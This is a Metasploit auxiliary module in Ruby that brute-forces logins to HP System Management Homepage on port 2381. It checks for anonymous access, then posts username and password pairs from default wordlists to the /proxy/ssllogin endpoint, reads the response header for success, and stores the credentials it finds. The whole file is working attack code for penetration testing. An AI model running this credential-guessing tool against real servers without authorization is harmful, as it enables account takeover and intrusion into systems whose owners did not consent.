##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(update_info(info,
      'Name'           => "HP System Management Homepage Login Utility",
      'Description'    => %q{
        This module attempts to login to HP System Management Homepage using host
        operating system authentication.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'sinn3r' ],
      'DefaultOptions' => { 'SSL' => true }
    ))

    register_options(
      [
        Opt::RPORT(2381),
        OptPath.new('USERPASS_FILE',  [ false, "File containing users and passwords separated by space, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_userpass.txt") ]),
        OptPath.new('USER_FILE',  [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt") ]),
      ], self.class)
  end

  def anonymous_access?
    res = send_request_raw({'uri' => '/'})
    return true if res and res.body =~ /username = "hpsmh_anonymous"/
    false
  end

  def do_login(user, pass)
    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => '/proxy/ssllogin',
        'vars_post' => {
          'redirecturl'         => '',
          'redirectquerystring' => '',
          'user'                => user,
          'password'            => pass
        }
      })

      if not res
        print_error("#{peer} - Connection timed out")
        return :abort
      end
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED
      print_error("#{peer} - Failed to response")
      return :abort
    end

    if res.headers['CpqElm-Login'].to_s =~ /success/
      print_good("#{peer} - Successful login: '#{user}:#{pass}'")
      report_auth_info({
        :host  => rhost,
        :port  => rport,
        :sname => 'https',
        :user  => user,
        :pass  => pass,
        :proof => "CpqElm-Login: #{res.headers['CpqElm-Login']}"
      })

      return :next_user
    end
  end


  def run
    if anonymous_access?
      print_status("#{peer} - No login necessary. Server allows anonymous access.")
      return
    end

    each_user_pass { |user, pass|
      # Actually respect the BLANK_PASSWORDS option
      next if not datastore['BLANK_PASSWORDS'] and pass.blank?

      vprint_status("#{peer} - Trying: '#{user}:#{pass}'")
      do_login(user, pass)
    }
  end
end

=begin
Tested: v6.3.1.24 upto v7.2.1.3
=end
